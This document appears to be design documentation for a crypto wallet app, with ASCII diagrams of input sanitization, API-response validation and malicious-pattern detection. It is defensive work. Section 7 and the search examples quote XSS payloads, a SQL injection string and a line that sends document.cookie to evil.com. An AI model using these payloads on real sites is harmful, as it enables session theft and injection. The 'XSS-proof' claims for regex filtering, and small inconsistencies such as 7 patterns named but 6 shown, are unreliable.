# 🔒 Data Validation Flow Diagrams

## 1. Input Sanitization Flow

```
┌─────────────────────────────────────────────────────────────┐
│                    USER INPUT RECEIVED                       │
│                    (Search, Form, etc.)                      │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ▼
            ┌──────────────────────┐
            │ Detect Input Type    │
            └──────┬───────────────┘
                   │
        ┌──────────┼──────────┐
        │          │          │
        ▼          ▼          ▼
   ┌────────┐ ┌────────┐ ┌────────┐
   │ STRING │ │NUMBER  │ │ADDRESS │
   └───┬────┘ └───┬────┘ └───┬────┘
       │          │          │
       ▼          ▼          ▼
 ┌───────────┐ ┌────────┐ ┌───────────┐
 │ Trim      │ │ Parse  │ │ Lowercase │
 │ Limit len │ │ Check  │ │ Add 0x    │
 │ Remove \0 │ │ NaN    │ │ Validate  │
 │ Escape HTML│ │ Clamp  │ │ Format    │
 └─────┬─────┘ └───┬────┘ └─────┬─────┘
       │          │          │
       ▼          ▼          ▼
 ┌────────────────────────────────┐
 │     SANITIZED OUTPUT           │
 │  • Safe for rendering          │
 │  • Type-checked                │
 │  • Range-validated             │
 │  • XSS-proof                   │
 └────────────────────────────────┘
```

---

## 2. API Response Validation Flow

```
┌─────────────────────────────────────────────────────────────┐
│                  API RESPONSE RECEIVED                       │
│                  (CoinGecko, etc.)                           │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ▼
            ┌──────────────────────┐
            │ Parse JSON           │
            │ Try/Catch            │
            └──────┬───────────────┘
                   │
        ┌──────────┴──────────┐
        │                     │
        ▼                     ▼
   ┌────────┐           ┌────────┐
   │SUCCESS │           │ ERROR  │
   └───┬────┘           └───┬────┘
       │                    │
       │                    ▼
       │              ┌────────────┐
       │              │ Use Cache  │
       │              │ or Fallback│
       │              └────────────┘
       │
       ▼
┌──────────────────────┐
│ Check Data Type      │
│ (Array/Object)       │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ Validate Structure   │
│ • Required fields    │
│ • Field types        │
│ • Value ranges       │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ Detect Malicious     │
│ • Scripts            │
│ • Event handlers     │
│ • Injection patterns │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ Sanitize Each Field  │
│ • Strings: escape    │
│ • Numbers: clamp     │
│ • Addresses: format  │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ Filter Invalid Items │
│ (remove bad data)    │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│ Return Validated     │
│ • Safe to use        │
│ • Type-checked       │
│ • Range-validated    │
└──────────────────────┘
```

---

## 3. Market Data Validation Example

```
Raw API Response from CoinGecko:
═══════════════════════════════════════════════════════════════
[
  {
    "id": "bitcoin",
    "symbol": "btc",
    "name": "Bitcoin",
    "current_price": 67000,
    "market_cap": 1300000000000,
    "price_change_percentage_24h": 2.1
  },
  {
    "id": "<script>evil()</script>",  ← MALICIOUS!
    "symbol": "eth",
    "name": "Ethereum",
    "current_price": "not_a_number",  ← INVALID!
    "market_cap": -1000               ← NEGATIVE!
  }
]
═══════════════════════════════════════════════════════════════

Validation Process:
═══════════════════════════════════════════════════════════════

Step 1: Check Array ✓
  → Is array: YES

Step 2: Validate Each Coin
  → Coin #1 (bitcoin):
    ✓ Has id, symbol, name
    ✓ Price is number >= 0
    ✓ Market cap is number >= 0
    → RESULT: VALID ✓

  → Coin #2 (malicious):
    ✗ id contains script tag → SANITIZE
    ✓ Has symbol, name
    ✗ Price is string → INVALID ✗
    ✗ Market cap is negative → INVALID ✗
    → RESULT: FILTERED OUT ✗

Step 3: Sanitize Valid Coins
  → Coin #1:
    id: "bitcoin" → "bitcoin" (safe)
    symbol: "btc" → "BTC" (uppercase)
    name: "Bitcoin" → "Bitcoin" (safe)
    price: 67000 → 67000 (valid)
    market_cap: 1.3e12 → 1.3e12 (valid)
    change: 2.1 → 2.1 (valid)

Step 4: Return Validated Data
═══════════════════════════════════════════════════════════════
[
  {
    "id": "bitcoin",
    "symbol": "BTC",
    "name": "Bitcoin",
    "price": 67000,
    "marketCap": 1300000000000,
    "change24h": 2.1,
    "icon": "₿"
  }
]
═══════════════════════════════════════════════════════════════

Result: 1 valid coin (malicious one filtered out) ✅
```

---

## 4. Search Input Sanitization

```
User Types in Search Box:
═══════════════════════════════════════════════════════════════

Example 1: Normal Search
  Input: "BTC"
  → sanitizeSearchInput("BTC")
  → Allowed: B, T, C (alphanumeric)
  → Output: "BTC" ✅

Example 2: XSS Attack
  Input: "<script>alert('xss')</script>"
  → sanitizeSearchInput("<script>alert('xss')</script>")
  → Remove: < > ' ( ) / (not allowed)
  → Output: "scriptalertxss/script" (harmless) ✅

Example 3: SQL Injection
  Input: "BTC'; DROP TABLE coins;--"
  → sanitizeSearchInput("BTC'; DROP TABLE coins;--")
  → Remove: ' ; - (not allowed)
  → Output: "BTC DROP TABLE coins" (harmless) ✅

Example 4: Special Characters
  Input: "BTC/ETH @#$%"
  → sanitizeSearchInput("BTC/ETH @#$%")
  → Remove: / @ # $ % (not allowed)
  → Output: "BTC ETH" (safe) ✅

Example 5: Allowed Characters
  Input: "BTC-ETH_USD.coin"
  → sanitizeSearchInput("BTC-ETH_USD.coin")
  → Allowed: - _ . (explicitly allowed)
  → Output: "BTC-ETH_USD.coin" ✅
```

---

## 5. Number Validation & Range Checking

```
Input Number Validation:
═══════════════════════════════════════════════════════════════

Function: sanitizeNumber(input, { min, max, decimals })

Example 1: Normal Number
  Input: "123.456"
  Config: { min: 0, max: 1000, decimals: 2 }
  → Parse: 123.456
  → Check: 0 <= 123.456 <= 1000 ✓
  → Round: 123.46
  → Output: 123.46 ✅

Example 2: Too Large
  Input: "99999"
  Config: { min: 0, max: 1000, decimals: 2 }
  → Parse: 99999
  → Check: 99999 > 1000 ✗
  → Clamp: 1000
  → Output: 1000.00 ✅

Example 3: Negative
  Input: "-50"
  Config: { min: 0, max: 1000, decimals: 2 }
  → Parse: -50
  → Check: -50 < 0 ✗
  → Clamp: 0
  → Output: 0.00 ✅

Example 4: Invalid
  Input: "abc"
  Config: { min: 0, max: 1000, decimals: 2 }
  → Parse: NaN
  → Check: isNaN ✗
  → Default: 0
  → Output: 0.00 ✅

Example 5: Too Many Decimals
  Input: "123.456789012345678"
  Config: { min: 0, max: 1000, decimals: 8 }
  → Parse: 123.456789012345678
  → Check: Valid ✓
  → Round: 123.45678901
  → Output: 123.45678901 ✅

Example 6: Infinity
  Input: "1e100"
  Config: { min: 0, max: 1e18, decimals: 8 }
  → Parse: 1e100
  → Check: 1e100 > 1e18 ✗
  → Clamp: 1e18
  → Output: 1000000000000000000.00000000 ✅
```

---

## 6. Dashboard Data Flow with Validation

```
┌────────────────────────────────────────────────────────────┐
│                    DASHBOARD COMPONENT                      │
└────────────────────────────────────────────────────────────┘

1. Balance Data Flow:
═══════════════════════════════════════════════════════════════

chainBalances (from WalletContext)
       │
       ▼
┌──────────────────┐
│ validateBalance  │
│ Data()           │
└──────┬───────────┘
       │
       ▼
  { ETH: 1.5, USDC: 1000 }  ← Validated
       │
       ▼
┌──────────────────┐
│ sanitizeNumber   │
│ for each value   │
└──────┬───────────┘
       │
       ▼
  Display: "1.5000 ETH"  ← Safe ✅


2. Market Data Flow:
═══════════════════════════════════════════════════════════════

fetchMarketData()
       │
       ▼
  CoinGecko API Response
       │
       ▼
┌──────────────────┐
│ validateMarket   │
│ Data()           │
└──────┬───────────┘
       │
       ▼
  Array of validated coins
       │
       ▼
┌──────────────────┐
│ Filter by search │ (sanitizeSearchInput)
└──────┬───────────┘
       │
       ▼
  Display Market List  ← Safe ✅


3. Price History Flow:
═══════════════════════════════════════════════════════════════

fetchPriceHistory(symbol, days)
       │
       ▼
  Validate symbol (string, length)
  Validate days (1-365)
       │
       ▼
  CoinGecko Chart API
       │
       ▼
┌──────────────────┐
│ validatePrice    │
│ History()        │
└──────┬───────────┘
       │
       ▼
  Array of { ts, price, date }
       │
       ▼
┌──────────────────┐
│ Render Chart     │
└──────────────────┘
       │
       ▼
  PortfolioChart component  ← Safe ✅


4. Search Input Flow:
═══════════════════════════════════════════════════════════════

User types in search box
       │
       ▼
┌──────────────────┐
│ onChange event   │
└──────┬───────────┘
       │
       ▼
┌──────────────────┐
│ sanitizeSearch   │
│ Input()          │
└──────┬───────────┘
       │
       ▼
  Set marketFilter state  ← Sanitized
       │
       ▼
┌──────────────────┐
│ Filter coins     │
│ (safe compare)   │
└──────┬───────────┘
       │
       ▼
  Display filtered list  ← Safe ✅
```

---

## 7. Malicious Data Detection

```
Detection Patterns:
═══════════════════════════════════════════════════════════════

Pattern 1: Script Tags
  Input: '<script>alert("xss")</script>'
  → Match: /<script/i
  → DETECTED 🚨
  → Action: Block/Sanitize

Pattern 2: JavaScript URLs
  Input: 'javascript:alert(document.cookie)'
  → Match: /javascript:/i
  → DETECTED 🚨
  → Action: Block/Sanitize

Pattern 3: Event Handlers
  Input: '<img src=x onerror=alert(1)>'
  → Match: /on\w+\s*=/i
  → DETECTED 🚨
  → Action: Block/Sanitize

Pattern 4: Eval Calls
  Input: 'eval("malicious code")'
  → Match: /eval\(/i
  → DETECTED 🚨
  → Action: Block/Sanitize

Pattern 5: Cookie Access
  Input: 'document.location="http://evil.com/?c="+document.cookie'
  → Match: /document\.cookie/i
  → DETECTED 🚨
  → Action: Block/Sanitize

Pattern 6: Location Manipulation
  Input: 'window.location.href="http://evil.com"'
  → Match: /window\.location/i
  → DETECTED 🚨
  → Action: Block/Sanitize


Detection Flow:
═══════════════════════════════════════════════════════════════

Input Data
    │
    ▼
┌──────────────────┐
│ Convert to       │
│ string           │
└──────┬───────────┘
       │
       ▼
┌──────────────────┐
│ Test against 7   │
│ malicious patterns│
└──────┬───────────┘
       │
   ┌───┴───┐
   │       │
   ▼       ▼
 MATCH   NO MATCH
   │       │
   │       ▼
   │   ┌────────┐
   │   │ Safe   │
   │   │ ✓      │
   │   └────────┘
   ▼
┌────────┐
│ BLOCK  │
│ Sanitize│
│ Log 🚨 │
└────────┘
```

---

## 8. Complete Security Pipeline

```
┌────────────────────────────────────────────────────────────┐
│              dWALLET SECURITY PIPELINE                      │
│                                                             │
│  Input → Validate → Sanitize → Check → Use                 │
│                                                             │
└────────────────────────────────────────────────────────────┘

Layer 1: Input Reception
═══════════════════════════════════════════════════════════════
  Sources:
  • User input (forms, search)
  • API responses (CoinGecko)
  • Blockchain data (balances, txs)
  • URL parameters
  • Local storage

Layer 2: Type Checking
═══════════════════════════════════════════════════════════════
  Checks:
  • Is it the expected type?
  • Is it null/undefined?
  • Is it an array/object?
  
  Functions:
  • isString()
  • isNumber()
  • isObject()
  • isArray()

Layer 3: Value Validation
═══════════════════════════════════════════════════════════════
  Checks:
  • Is number in range?
  • Is string within length?
  • Is address valid format?
  • Is date valid?
  
  Functions:
  • sanitizeNumber()
  • sanitizeString()
  • isValidEthAddress()

Layer 4: Security Scanning
═══════════════════════════════════════════════════════════════
  Checks:
  • Contains scripts?
  • Contains event handlers?
  • Contains injection?
  • Contains eval?
  
  Functions:
  • detectMaliciousData()
  • sanitizeSearchInput()

Layer 5: Sanitization
═══════════════════════════════════════════════════════════════
  Actions:
  • Escape HTML entities
  • Trim whitespace
  • Limit length
  • Clamp ranges
  • Remove null bytes
  
  Functions:
  • sanitizeString()
  • sanitizeNumber()
  • sanitizeEthAddress()

Layer 6: Integration
═══════════════════════════════════════════════════════════════
  Results:
  • Safe for rendering
  • Type-checked
  • Range-validated
  • XSS-proof
  
  Usage:
  • setState(sanitizedData)
  • render(safeData)
  • sendTransaction(validatedTx)

Layer 7: Monitoring
═══════════════════════════════════════════════════════════════
  Logging:
  • ✅ Success logs
  • ⚠️ Warning logs
  • ❌ Error logs
  • 🚨 Security alerts
  
  Functions:
  • console.log()
  • console.warn()
  • console.error()
```

---

These diagrams illustrate the complete data validation and sanitization pipeline that protects the dWallet from various security threats.
